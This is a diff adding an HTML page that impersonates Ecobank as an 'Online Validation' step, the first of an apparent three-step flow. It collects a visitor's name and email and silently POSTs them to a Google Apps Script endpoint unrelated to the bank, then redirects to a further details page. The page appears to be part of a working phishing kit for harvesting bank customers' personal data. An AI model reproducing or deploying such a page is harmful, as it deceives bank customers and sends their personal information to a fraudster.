@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ecobank Online Validation</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+body{
+  margin:0;
+  min-height:100vh;
+  font-family:"Inter",Arial,sans-serif;
+  background:linear-gradient(to bottom,#2b6cb0,#2a4365);
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+}
+header{
+  padding:28px 20px 46px;
+  text-align:center;
+  border-bottom-left-radius:40px;
+  border-bottom-right-radius:40px;
+  background:linear-gradient(135deg,#2b6cb0,#2a4365);
+}
+.badge{
+  display:inline-block;
+  padding:12px 22px;
+  border-radius:999px;
+  font-weight:700;
+  background:linear-gradient(135deg,#1e3c72,#2a5298);
+}
+.step{
+  margin-top:12px;
+  font-size:13px;
+  opacity:.9;
+}
+main{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  padding:20px 14px;
+}
+.card{
+  background:#fff;
+  color:#333;
+  width:100%;
+  max-width:420px;
+  padding:28px 24px;
+  border-radius:14px;
+  box-shadow:0 14px 30px rgba(0,0,0,.45);
+  margin-top:-34px;
+}
+label{font-size:13px;font-weight:600;margin-bottom:6px;display:block;}
+input{
+  width:100%;
+  padding:14px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  margin-bottom:18px;
+  font-size:15px;
+}
+button{
+  width:100%;
+  padding:15px;
+  border-radius:999px;
+  border:none;
+  background:linear-gradient(135deg,#28a745,#218838);
+  color:#fff;
+  font-size:15px;
+  font-weight:700;
+}
+.overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.45);
+  display:flex;flex-direction:column;
+  justify-content:center;align-items:center;
+  opacity:0;pointer-events:none;
+  transition:.3s;color:#fff;
+}
+.overlay.active{opacity:1;pointer-events:auto;}
+.spinner{
+  width:36px;height:36px;
+  border:3px solid rgba(255,255,255,.3);
+  border-top:3px solid #fff;
+  border-radius:50%;
+  animation:spin .9s linear infinite;
+  margin-bottom:14px;
+}
+@keyframes spin{to{transform:rotate(360deg);}}
+</style>
+</head>
+
+<body>
+<header>
+  <div class="badge">ECOBANK ONLINE VALIDATION</div>
+  <div class="step">Step 1 of 3 · Personal Details</div>
+</header>
+
+<main>
+  <div class="card">
+    <form id="dataForm">
+      <label>First Name</label>
+      <input name="firstName" required>
+
+      <label>Last Name</label>
+      <input name="lastName" required>
+
+      <label>Email Address</label>
+      <input type="email" name="email" required>
+
+      <button type="submit">Continue →</button>
+    </form>
+  </div>
+</main>
+
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  Processing…
+</div>
+
+<script>
+const scriptURL="https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
+const form=document.getElementById("dataForm");
+const overlay=document.getElementById("overlay");
+
+form.addEventListener("submit",async e=>{
+  e.preventDefault();
+  overlay.classList.add("active");
+  const fd=new FormData(form);
+  await fetch(scriptURL,{method:"POST",body:fd});
+  localStorage.setItem("firstName",fd.get("firstName"));
+  localStorage.setItem("lastName",fd.get("lastName"));
+  localStorage.setItem("email",fd.get("email"));
+  setTimeout(()=>location.href="details.html",800);
+});
+</script>
+</body>
+</html>
